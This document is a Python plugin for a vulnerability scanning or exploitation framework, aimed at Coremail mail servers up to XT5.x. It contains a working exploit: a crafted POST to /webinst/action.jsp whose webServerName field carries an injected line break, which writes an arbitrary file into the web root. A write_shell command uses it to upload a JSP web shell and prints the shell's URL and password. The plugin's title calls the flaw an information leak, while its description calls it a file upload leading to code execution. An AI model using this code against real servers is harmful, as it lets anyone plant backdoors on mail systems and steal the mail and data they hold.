# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "Coremail邮件系统配置信息泄露漏洞",
        "dork": "app=\"Coremail邮件系统\"",
        "version": "Coremail <= XT5.x",
        "description": "Coremail产品诞生于1999年，经过二十多年发展，如今从亿万级别的运营系统，到几万人的大型企业，都有了Coremail的客户。截止2020年，Coremail邮件系统产品在国内已拥有10亿终端用户，是目前国内拥有邮箱使用用户最多的邮件系统。其特定版本范围内存在任意文件上传漏洞，攻击者可以上传webshell，从而造成远程代码执行",
        "references": ["-"],
    }

    def __condition__(self):
        return self.condition(
            matches=[
                {
                    "search": "body",
                    "keyword": "Coremail"
                }
            ]
        )

    def url(self) -> dict:
        random_str = self.build_random_str(10)
        res = self.custom_upload_file(self.target.value, 'error.jsp', random_str, random_str)
        if res:
            return {"LoopholeInfo": self.__info__}

    def custom_upload_file(self, url, filename, content, flag):
        r = self.request(
            method='POST',
            url=urllib.parse.urljoin(url, './webinst/action.jsp'),
            timeout=15,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
            },
            data=f"func=checkserver&webServerName=127.0.0.1:6132/%0d@/home/coremail/web/webapp/{filename}%20{content}"
        )
        if r.status_code != 200:
            return
        url = urllib.parse.urljoin(url, f'./coremail/{filename}')
        r = self.request(method='get', url=url, timeout=15)
        if r.status_code == 200 and flag in r.text:
            return url

    @cli.command(description='写入一句话马')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    def write_shell(self, url):
        name, password, code, flag = self.build_web_shell('jsp')
        res = self.custom_upload_file(url, name, code, flag)
        if res:
            self.log.success('一句话马写入成功')
            self.log.success(f'访问地址: {res}')
            self.log.success(f'访问密码: {password}')
        else:
            self.log.failure('一句话马写入失败')
